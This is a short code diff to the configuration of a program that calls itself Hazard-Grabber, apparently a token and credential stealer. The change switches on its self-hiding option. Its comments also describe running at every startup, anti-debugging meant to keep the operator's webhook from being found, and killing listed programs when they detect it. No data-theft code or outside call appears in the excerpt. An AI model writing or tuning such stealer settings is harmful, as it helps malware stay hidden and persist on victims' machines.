@@ -34,7 +34,7 @@ config = {
     # This makes the program run the file after every startup.
     'startup': True,
     # This feature will make the file hide itself after opened.
-    'hide_self': False,
+    'hide_self': True,
     # It does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found.
     'anti_debug': True,
     # This list of programs will be killed if Hazard-Grabber detects that any of these are running, you can add more or remove programs if you want.
